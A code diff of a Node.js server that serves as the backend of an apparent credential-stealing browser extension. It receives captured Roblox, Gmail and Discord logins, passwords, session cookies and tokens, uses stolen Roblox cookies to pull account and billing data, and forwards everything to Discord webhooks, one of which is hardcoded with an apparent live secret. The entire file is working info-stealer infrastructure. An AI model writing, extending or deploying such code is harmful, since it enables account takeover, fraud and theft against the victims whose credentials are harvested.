@@ -1,41 +1,10 @@
+
 const express = require('express');
 const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
 const HOST = '0.0.0.0';
-
-// Global tracking to prevent duplicate sends with time-based expiration
-const sentTokens = new Map(); // Track sent Discord tokens with timestamps
-const sentSIDs = new Map(); // Track sent Gmail SIDs with timestamps
-const sentRobloxCookies = new Map(); // Track sent Roblox cookies with timestamps
-const sentCredentials = new Map(); // Track sent credentials with timestamps
-
-// Time window for deduplication (30 minutes)
-const DEDUPLICATION_WINDOW = 30 * 60 * 1000; // 30 minutes in milliseconds
-
-// Function to check if an item was recently sent
-function wasRecentlySent(trackingMap, key) {
-  if (!trackingMap.has(key)) {
-    return false;
-  }
-  
-  const timestamp = trackingMap.get(key);
-  const now = Date.now();
-  
-  // If it's been more than the deduplication window, allow it
-  if (now - timestamp > DEDUPLICATION_WINDOW) {
-    trackingMap.delete(key); // Clean up old entry
-    return false;
-  }
-  
-  return true;
-}
-
-// Function to mark an item as sent
-function markAsSent(trackingMap, key) {
-  trackingMap.set(key, Date.now());
-}
 
 // Middleware
 app.use(cors());
@@ -44,38 +13,26 @@ app.use(express.json());
 // Serve static files (extension files)
 app.use(express.static(__dirname));
 
-// Separate webhook URLs for each service from environment variables
-const ROBLOX_WEBHOOK_URL = process.env.ROBLOX_WEBHOOK_URL;
-const GMAIL_WEBHOOK_URL = process.env.GMAIL_WEBHOOK_URL;
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+// Webhook URLs from environment variables
+const ROBLOX_WEBHOOK_URL = process.env.ROBLOX_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
+const GMAIL_WEBHOOK_URL = process.env.GMAIL_WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_GMAIL_WEBHOOK_URL_HERE';
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_URL_HERE';
 
-// Validate that all webhook URLs are set
-if (!ROBLOX_WEBHOOK_URL) {
-  console.error('ERROR: ROBLOX_WEBHOOK_URL environment variable is not set');
-  process.exit(1);
-}
-
-if (!GMAIL_WEBHOOK_URL) {
-  console.error('ERROR: GMAIL_WEBHOOK_URL environment variable is not set');
-  process.exit(1);
-}
-
-if (!DISCORD_WEBHOOK_URL) {
-  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
-  process.exit(1);
-}
-
-// Function to get the appropriate webhook URL based on service type
-function getWebhookUrl(logLevel) {
-  if (logLevel.startsWith('roblox')) {
-    return ROBLOX_WEBHOOK_URL;
-  } else if (logLevel.startsWith('gmail')) {
-    return GMAIL_WEBHOOK_URL;
-  } else if (logLevel.startsWith('discord')) {
-    return DISCORD_WEBHOOK_URL;
+// Function to get appropriate webhook URL based on log type
+function getWebhookUrl(logType) {
+  switch(logType) {
+    case 'gmail_login':
+    case 'gmail_data':
+      return GMAIL_WEBHOOK_URL;
+    case 'discord_login':
+    case 'discord_token':
+      return DISCORD_WEBHOOK_URL;
+    case 'roblox_login':
+    case 'roblox_userdata':
+    case 'roblox_combined':
+    default:
+      return ROBLOX_WEBHOOK_URL;
   }
-  // Default fallback to Discord webhook for other log types
-  return DISCORD_WEBHOOK_URL;
 }
 
 // Function to get CSRF token for Roblox API requests
@@ -104,7 +61,7 @@ async function getRobloxCSRFToken(token) {
 async function fetchRobloxUserData(token) {
   try {
     console.log('Fetching comprehensive Roblox user data...');
-
+    
     // Get CSRF token first
     const csrfToken = await getRobloxCSRFToken(token);
 
@@ -229,7 +186,7 @@ async function fetchRobloxUserData(token) {
     let premiumData = { isPremium: false };
     let creditBalance = 0;
     let savedPayment = false;
-
+    
     try {
       const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
         headers: baseHeaders
@@ -237,10 +194,10 @@ async function fetchRobloxUserData(token) {
 
       if (billingResponse.ok) {
         const billingData = await billingResponse.json();
-
+        
         creditBalance = billingData.balance || 0;
         savedPayment = billingData.hasSavedPayments || false;
-
+        
         premiumData.isPremium = billingData.hasPremium || 
                                billingData.isPremium || 
                                (billingData.balance && billingData.balance > 0) || 
@@ -472,169 +429,27 @@ async function fetchRobloxUserData(token) {
   }
 }
 
-// Function to generate credential hash for deduplication
-function generateCredentialHash(credentials, service) {
-  if (!credentials) return null;
-  const username = credentials.username || credentials.email || '';
-  const password = credentials.password || '';
-  if (!username && !password) return null;
-  return `${service}:${username}:${password}`;
-}
-
-// Function to generate token/cookie hash for deduplication
-function generateTokenHash(token, service) {
-  if (!token || token.length < 10) return null;
-  // Use first and last 10 characters to create a unique identifier
-  return `${service}:${token.substring(0, 10)}...${token.substring(token.length - 10)}`;
-}
-
 // Endpoint to receive logs from browser extension
 app.post('/send-log', async (req, res) => {
   try {
     const logData = req.body;
-    console.log('Received log:', logData.level);
-
-    // Check for duplicates based on service type
-    let shouldSkip = false;
-    let skipReason = '';
-
-    // Handle Discord captures
-    if (logData.level === 'discord_captured' && logData.token) {
-      const tokenHash = generateTokenHash(logData.token, 'discord');
-      if (tokenHash && wasRecentlySent(sentTokens, tokenHash)) {
-        shouldSkip = true;
-        skipReason = 'Discord token already sent';
-      } else if (tokenHash) {
-        markAsSent(sentTokens, tokenHash);
-      }
-
-      // Also check credentials if available
-      if (logData.credentials && !shouldSkip) {
-        const credHash = generateCredentialHash(logData.credentials, 'discord');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Discord credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Handle Discord login credentials
-    if (logData.level === 'discord_login') {
-      // Extract credentials from message
-      const messageMatch = logData.message && logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
-      if (messageMatch) {
-        const credentials = { email: messageMatch[1], password: messageMatch[2] };
-        const credHash = generateCredentialHash(credentials, 'discord');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Discord login credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Handle Gmail captures
-    if (logData.level === 'gmail_captured' && logData.sid) {
-      const sidHash = generateTokenHash(logData.sid, 'gmail');
-      if (sidHash && wasRecentlySent(sentSIDs, sidHash)) {
-        shouldSkip = true;
-        skipReason = 'Gmail SID already sent';
-      } else if (sidHash) {
-        markAsSent(sentSIDs, sidHash);
-      }
-
-      // Also check credentials if available
-      if (logData.credentials && !shouldSkip) {
-        const credHash = generateCredentialHash(logData.credentials, 'gmail');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Gmail credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Handle Gmail login credentials
-    if (logData.level === 'gmail_login') {
-      // Extract credentials from message
-      const messageMatch = logData.message && logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
-      if (messageMatch) {
-        const credentials = { email: messageMatch[1], password: messageMatch[2] };
-        const credHash = generateCredentialHash(credentials, 'gmail');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Gmail login credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Handle Roblox combined (with time-based deduplication)
-    if (logData.level === 'roblox_combined' && logData.cookie) {
-      const cookieHash = generateTokenHash(logData.cookie, 'roblox');
-      if (cookieHash && wasRecentlySent(sentRobloxCookies, cookieHash)) {
-        shouldSkip = true;
-        skipReason = 'Roblox cookie already sent';
-      } else if (cookieHash) {
-        markAsSent(sentRobloxCookies, cookieHash);
-      }
-
-      // Also check credentials
-      if (logData.credentials && !shouldSkip) {
-        const credHash = generateCredentialHash(logData.credentials, 'roblox');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Roblox credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Handle Roblox login credentials
-    if (logData.level === 'roblox_login') {
-      // Extract credentials from message
-      const messageMatch = logData.message && logData.message.match(/Username:\s*(.+?),\s*Password:\s*(.+)/);
-      if (messageMatch) {
-        const credentials = { username: messageMatch[1], password: messageMatch[2] };
-        const credHash = generateCredentialHash(credentials, 'roblox');
-        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
-          shouldSkip = true;
-          skipReason = 'Roblox login credentials already sent';
-        } else if (credHash) {
-          markAsSent(sentCredentials, credHash);
-        }
-      }
-    }
-
-    // Skip sending if duplicate
-    if (shouldSkip) {
-      console.log(`Skipping duplicate: ${skipReason}`);
-      res.status(200).json({ success: true, skipped: true, reason: skipReason });
-      return;
-    }
-
+    console.log('Received log:', logData);
+    
     // Handle roblox_combined type - fetch data first, then format
     if (logData.level === 'roblox_combined') {
       console.log('Processing combined Roblox data - fetching comprehensive user data...');
-
+      
       // Fetch comprehensive user data using the security token
       const comprehensiveUserData = await fetchRobloxUserData(logData.cookie);
-
+      
       if (comprehensiveUserData) {
         console.log('Successfully fetched comprehensive user data for:', comprehensiveUserData.username);
-
+        
         // Create the combined message with comprehensive data
         const discordMessage = formatRobloxCombinedEmbedWithData(logData, comprehensiveUserData);
-
-        // Send to appropriate webhook based on service type
-        const webhookUrl = getWebhookUrl(logData.level);
-        const response = await fetch(webhookUrl, {
+        
+        // Send to Roblox webhook
+        const response = await fetch(getWebhookUrl(logData.level), {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -653,9 +468,8 @@ app.post('/send-log', async (req, res) => {
         console.error('Failed to fetch comprehensive user data');
         // Fallback to original format if data fetch fails
         const discordMessage = formatLogForDiscord(logData);
-
-        const webhookUrl = getWebhookUrl(logData.level);
-        const response = await fetch(webhookUrl, {
+        
+        const response = await fetch(getWebhookUrl(logData.level), {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -672,10 +486,10 @@ app.post('/send-log', async (req, res) => {
         }
       }
     } else {
-      // Handle other log types normally
+      // Handle other log types normally with appropriate webhooks
       const discordMessage = formatLogForDiscord(logData);
-
       const webhookUrl = getWebhookUrl(logData.level);
+      
       const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -685,13 +499,11 @@ app.post('/send-log', async (req, res) => {
       });
 
       if (response.ok) {
-        // The original fix was for a different function, this is the relevant one for 'else' block
-        const messagePreview = (logData.message && typeof logData.message === 'string') ? logData.message.substring(0, 50) : 'No message';
-        console.log(`Log sent to Discord: ${logData.level} - ${messagePreview}...`);
+        console.log(`Log sent to webhook: ${logData.level} - ${logData.message.substring(0, 50)}...`);
         res.status(200).json({ success: true });
       } else {
-        console.error('Failed to send to Discord:', response.status, response.statusText);
-        res.status(500).json({ error: 'Failed to send to Discord' });
+        console.error('Failed to send to webhook:', response.status, response.statusText);
+        res.status(500).json({ error: 'Failed to send to webhook' });
       }
     }
   } catch (error) {
@@ -748,7 +560,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
       },
       {
         name: "<:emoji_31:1410233610031857735> **Robux In/Out**",
-        value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
+        value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
         inline: true
       },
       {
@@ -808,32 +620,32 @@ function formatLogForDiscord(logData) {
     error: '❌',
     roblox_login: '🔐',
     roblox_userdata: '👤',
-    roblox_combined: '🔐'
+    roblox_combined: '🔐',
+    gmail_login: '📧',
+    discord_login: '💬',
+    discord_token: '🔑'
   };
 
-  // Handle different types of Roblox logs
+  // Handle different types of logs
   if (logData.level === 'roblox_login') {
     return formatRobloxLoginEmbed(logData);
   } else if (logData.level === 'roblox_userdata') {
     return formatRobloxUserDataEmbed(logData);
   } else if (logData.level === 'roblox_combined') {
     return formatRobloxCombinedEmbed(logData);
-  } else if (logData.level === 'gmail_captured') {
-    return formatGmailEmbed(logData);
   } else if (logData.level === 'gmail_login') {
     return formatGmailLoginEmbed(logData);
-  } else if (logData.level === 'discord_captured') {
-    return formatDiscordEmbed(logData);
   } else if (logData.level === 'discord_login') {
     return formatDiscordLoginEmbed(logData);
+  } else if (logData.level === 'discord_token') {
+    return formatDiscordTokenEmbed(logData);
   }
 
   // Standard log formatting
   const embed = {
     embeds: [{
       title: `${levelEmojis[logData.level] || '📝'} Browser Log - ${logData.level.toUpperCase()}`,
-      // Ensure logData.message is a string before calling substring
-      description: `\`\`\`\n${(logData.message && typeof logData.message === 'string') ? logData.message.substring(0, 50) : 'No message'}\`\`\``,
+      description: `\`\`\`\n${logData.message}\`\`\``,
       color: getColorForLevel(logData.level),
       fields: [
         {
@@ -856,12 +668,42 @@ function formatLogForDiscord(logData) {
   return embed;
 }
 
+function formatGmailLoginEmbed(logData) {
+  return {
+    embeds: [{
+      title: `📧 **GMAIL LOGIN CAPTURED**`,
+      description: "**```"+logData.message.replace(", ", "\n")+"```**",
+      color: 0xEA4335,
+      fields: [
+        {
+          name: '🌐 **Login URL**',
+          value: logData.url || 'Unknown',
+          inline: true
+        },
+        {
+          name: '⏰ **Timestamp**',
+          value: new Date(logData.timestamp).toLocaleString(),
+          inline: true
+        },
+        {
+          name: '✅ **Status**',
+          value: 'Gmail credentials captured successfully',
+          inline: false
+        }
+      ],
+      footer: {
+        text: `Gmail Account Compromised - Handle with Care`
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
+    }]
+  };
+}
+
 function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
       title: `<:emoji_37:1410520517349212200> **LOGIN GRABBER**`,
-      // Ensure logData.message is a string before calling replace
-      description: "```" + (logData.message && typeof logData.message === 'string' ? logData.message.replace(", ", "\n") : 'No message') + "```",
+      description: "**```"+logData.message.replace(", ", "\n")+"```**",
       color: 0xFFFFFF,
       fields: [
         {
@@ -890,9 +732,8 @@ function formatRobloxLoginEmbed(logData) {
 
 function formatRobloxUserDataEmbed(logData) {
   try {
-    // Ensure logData.message is a string before parsing
-    const userData = JSON.parse((logData.message && typeof logData.message === 'string') ? logData.message : '{}');
-
+    const userData = JSON.parse(logData.message);
+    
     return {
       embeds: [{
         title: `👤 ROBLOX USER DATA CAPTURED`,
@@ -1000,8 +841,7 @@ function formatRobloxCombinedEmbed(logData) {
   // Second embed: Security Cookie
   const cookieEmbed = {
     title: `🔐 ROBLOX SECURITY TOKEN CAPTURED`,
-    // Ensure logData.cookie is a string before using
-    description: `\`\`\`\n${logData.cookie || 'No cookie available'}\`\`\``,
+    description: `\`\`\`\n${logData.cookie}\`\`\``,
     color: 0xff6600,
     fields: [
       {
@@ -1087,106 +927,12 @@ function formatRobloxCombinedEmbed(logData) {
   return { embeds };
 }
 
-function formatGmailLoginEmbed(logData) {
-  return {
-    embeds: [{
-      title: `📧 **GMAIL LOGIN CAPTURED**`,
-      // Ensure logData.message is a string before calling replace
-      description: "```" + (logData.message && typeof logData.message === 'string' ? logData.message.replace(", ", "\n") : 'No message') + "```",
-      color: 0x4285F4,
-      fields: [
-        {
-          name: '🌐 **Login URL**',
-          value: logData.url || 'Unknown',
-          inline: true
-        },
-        {
-          name: '⏰ **Timestamp**',
-          value: new Date(logData.timestamp).toLocaleString(),
-          inline: true
-        },
-        {
-          name: '✅ **Status**',
-          value: 'Email and Password Captured',
-          inline: false
-        }
-      ],
-      footer: {
-        text: `🍪 Waiting for SID cookie...`
-      },
-      timestamp: new Date(logData.timestamp).toISOString()
-    }]
-  };
-}
-
-function formatGmailEmbed(logData) {
-  const embeds = [];
-
-  // First embed: Gmail Login Credentials and User Data
-  const gmailEmbed = {
-    title: "📧 **GMAIL ACCOUNT CAPTURED**",
-    color: 0x4285F4, // Google blue
-    thumbnail: logData.userData?.photo ? {
-      url: logData.userData.photo
-    } : undefined,
-    fields: [
-      {
-        name: "🔐 **Login Credentials**",
-        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
-        inline: false
-      },
-      {
-        name: "📧 **Account Email**",
-        value: logData.userData?.email || "Unknown",
-        inline: false
-      },
-      {
-        name: "👤 **Display Name**",
-        value: logData.userData?.name || "Unknown",
-        inline: true
-      },
-      {
-        name: "🌐 **Capture URL**",
-        value: logData.url || "Unknown",
-        inline: true
-      },
-      {
-        name: "⏰ **Timestamp**",
-        value: new Date(logData.timestamp).toLocaleString(),
-        inline: false
-      }
-    ],
-    footer: {
-      text: "Gmail Account Fully Compromised"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
-  };
-
-  // Second embed: SID Cookie
-  const cookieEmbed = {
-    title: "🍪 Gmail SID Cookie",
-    // Ensure logData.sid is a string before using
-    description: "**```" + (logData.sid || 'No SID available') + "```**",
-    color: 0x4285F4,
-    footer: {
-      text: "Handle with extreme caution!"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
-  };
-
-  embeds.push(gmailEmbed);
-  embeds.push(cookieEmbed);
-
-  return { embeds };
-}
-
 function formatDiscordLoginEmbed(logData) {
   return {
     embeds: [{
-      title: `🎮 **DISCORD LOGIN CAPTURED**`,
-      // Ensure logData.message is a string before calling replace
-      description: "```" + (logData.message && typeof logData.message === 'string' ? logData.message.replace(", ", "\n") : 'No message') + "```",
-      color: 0x5865F2, // Discord blurple
+      title: `💬 **DISCORD LOGIN CAPTURED**`,
+      description: "**```"+logData.message.replace(", ", "\n")+"```**",
+      color: 0x5865F2,
       fields: [
         {
           name: '🌐 **Login URL**',
@@ -1200,117 +946,47 @@ function formatDiscordLoginEmbed(logData) {
         },
         {
           name: '✅ **Status**',
-          value: 'Email and Password Captured',
+          value: 'Discord credentials captured successfully',
           inline: false
         }
       ],
       footer: {
-        text: `🔑 Waiting for Discord token...`
+        text: `Discord Account Compromised - Awaiting Token`
       },
       timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
 }
 
-function formatDiscordEmbed(logData) {
-  const embeds = [];
-
-  // First embed: Discord Login Credentials and User Data
-  const discordEmbed = {
-    title: "🎮 **DISCORD ACCOUNT CAPTURED**",
-    color: 0x5865F2, // Discord blurple
-    thumbnail: logData.userData?.avatar ? {
-      url: logData.userData.avatar
-    } : undefined,
-    fields: [
-      {
-        name: "🔐 **Login Credentials**",
-        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
-        inline: false
+function formatDiscordTokenEmbed(logData) {
+  return {
+    embeds: [{
+      title: `🔑 **DISCORD TOKEN CAPTURED**`,
+      description: "**```"+logData.message+"```**",
+      color: 0x5865F2,
+      fields: [
+        {
+          name: '🌐 **Source URL**',
+          value: logData.url || 'Unknown',
+          inline: true
+        },
+        {
+          name: '⏰ **Timestamp**',
+          value: new Date(logData.timestamp).toLocaleString(),
+          inline: true
+        },
+        {
+          name: '⚠️ **Security Alert**',
+          value: 'Full Discord account access token captured',
+          inline: false
+        }
+      ],
+      footer: {
+        text: `Discord Token Intercepted - Full Access Available`
       },
-      {
-        name: "👤 **Username**",
-        value: logData.userData?.username ? `${logData.userData.username}#${logData.userData.discriminator}` : "Unknown",
-        inline: true
-      },
-      {
-        name: "🌐 **Global Name**",
-        value: logData.userData?.globalName || "None",
-        inline: true
-      },
-      {
-        name: "📧 **Email**",
-        value: logData.userData?.email || "Unknown",
-        inline: false
-      },
-      {
-        name: "✅ **Verified**",
-        value: logData.userData?.verified ? "Yes" : "No",
-        inline: true
-      },
-      {
-        name: "🔐 **MFA Enabled**",
-        value: logData.userData?.mfaEnabled ? "Yes" : "No",
-        inline: true
-      },
-      {
-        name: "💎 **Nitro Type**",
-        value: logData.userData?.premiumType === 2 ? "Nitro" : logData.userData?.premiumType === 1 ? "Nitro Classic" : "None",
-        inline: true
-      },
-      {
-        name: "🏠 **Servers**",
-        value: logData.userData?.guildsCount?.toString() || "0",
-        inline: true
-      },
-      {
-        name: "👥 **Friends**",
-        value: logData.userData?.friendsCount?.toString() || "0",
-        inline: true
-      },
-      {
-        name: "🌍 **Locale**",
-        value: logData.userData?.locale || "Unknown",
-        inline: true
-      },
-      {
-        name: "🆔 **User ID**",
-        value: logData.userData?.id || "Unknown",
-        inline: false
-      },
-      {
-        name: "🌐 **Capture URL**",
-        value: logData.url || "Unknown",
-        inline: false
-      },
-      {
-        name: "⏰ **Timestamp**",
-        value: new Date(logData.timestamp).toLocaleString(),
-        inline: false
-      }
-    ],
-    footer: {
-      text: "Discord Account Fully Compromised"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
+      timestamp: new Date(logData.timestamp).toISOString()
+    }]
   };
-
-  // Second embed: Discord Token
-  const tokenEmbed = {
-    title: "🔑 Discord Token",
-    // Ensure logData.token is a string before using
-    description: "**```" + (logData.token || 'No token available') + "```**",
-    color: 0x5865F2,
-    footer: {
-      text: "Handle with extreme caution!"
-    },
-    timestamp: new Date(logData.timestamp).toISOString()
-  };
-
-  embeds.push(discordEmbed);
-  embeds.push(tokenEmbed);
-
-  return { embeds };
 }
 
 function getColorForLevel(level) {
@@ -1322,9 +998,9 @@ function getColorForLevel(level) {
     roblox_login: 0xff0000,
     roblox_userdata: 0x00ff00,
     roblox_combined: 0xff0000,
-    gmail_captured: 0x4285F4,
-    discord_captured: 0x5865F2,
-    discord_login: 0x5865F2
+    gmail_login: 0xEA4335,
+    discord_login: 0x5865F2,
+    discord_token: 0x5865F2
   };
   return colors[level] || colors.log;
 }
@@ -1348,28 +1024,10 @@ app.get('/health', (req, res) => {
   res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
-// Cleanup old entries every 10 minutes
-setInterval(() => {
-  const now = Date.now();
-  const maps = [sentTokens, sentSIDs, sentRobloxCookies, sentCredentials];
-  
-  maps.forEach(map => {
-    for (const [key, timestamp] of map.entries()) {
-      if (now - timestamp > DEDUPLICATION_WINDOW) {
-        map.delete(key);
-      }
-    }
-  });
-  
-  console.log('Cleaned up old deduplication entries');
-}, 10 * 60 * 1000); // Every 10 minutes
-
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Webhook service running on port ${PORT}`);
-  console.log('Webhook URLs configured:');
-  console.log(`- Roblox: ${ROBLOX_WEBHOOK_URL ? 'Yes' : 'No'}`);
-  console.log(`- Gmail: ${GMAIL_WEBHOOK_URL ? 'Yes' : 'No'}`);
-  console.log(`- Discord: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
-  console.log(`Deduplication window: ${DEDUPLICATION_WINDOW / 60000} minutes`);
+  console.log(`Roblox webhook configured: ${ROBLOX_WEBHOOK_URL ? 'Yes' : 'No'}`);
+  console.log(`Gmail webhook configured: ${GMAIL_WEBHOOK_URL !== 'https://discord.com/api/webhooks/YOUR_GMAIL_WEBHOOK_URL_HERE' ? 'Yes' : 'No'}`);
+  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_URL_HERE' ? 'Yes' : 'No'}`);
 });
